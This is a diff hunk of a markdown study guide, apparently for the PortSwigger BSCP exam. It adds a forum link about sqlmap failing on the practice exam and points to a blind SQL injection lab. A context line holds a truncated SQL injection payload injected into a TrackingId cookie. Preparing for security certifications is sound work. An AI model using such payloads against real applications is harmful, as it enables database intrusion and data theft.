@@ -1693,6 +1693,8 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 
 >SQLMAP version `1.7.2#stable` is no longer able to exploit the PortSwigger Practice exam. I had a similar vulnerability in one of my BSCP Exams and was not able to exploit using SQLMAP.  
 
+[PortSwigger Forum thread - SQLMAP](https://forum.portswigger.net/thread/stage-2-of-practice-exam-with-sqlmap-1-7-2-2078f927)  
+
 >I took the practice exam again and validated that I had to manually run the exploit using [PortSwigger Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval), see this exercise [Blind time delay](#blind-time-delay).
 
 [SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  
